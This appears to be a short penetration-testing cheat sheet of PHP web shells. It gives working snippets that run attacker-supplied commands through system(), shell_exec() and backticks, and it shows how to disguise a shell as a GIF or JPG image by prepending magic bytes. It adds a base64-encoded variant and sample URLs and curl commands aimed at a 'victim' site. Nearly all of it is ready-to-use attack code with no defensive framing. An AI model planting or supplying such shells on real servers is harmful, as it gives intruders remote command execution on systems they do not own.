More examples here
-------------------
https://github.com/jivoi/pentest/tree/master/shell

Simple PHP Webshell
-------------------
usage: http://www.yourvictim.com/shellname.php?cmd=whoami

```html
html
<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
 </body>
</html>
```

PHP web shell in a GIF or JPG with curl example
----------------------
```bash
echo 'FFD8FFEo' | xxd -r -p > test.gif
echo '<?php $c=$_GET['c']; echo `$c`; ?>' >> test.gif
curl -v http://ololo/uploads/test.gif?c=id
```

PHP web shell in GIF or JPG
--------------------
```php
GIF89a
<?php
echo "<pre>";
system($_GET['cmd']);
echo "</pre>";
?>
#http://victims.site.com/phpwebshell.gif?cmd=dir
```

Base64 Encoded PHP webshell
```php
<?php $c=shell_exec(base64_decode($_POST['cmd'])); echo base64_encode($c);?>
#http://victims.site.com/phpwebshell.php?cmd=dir
```
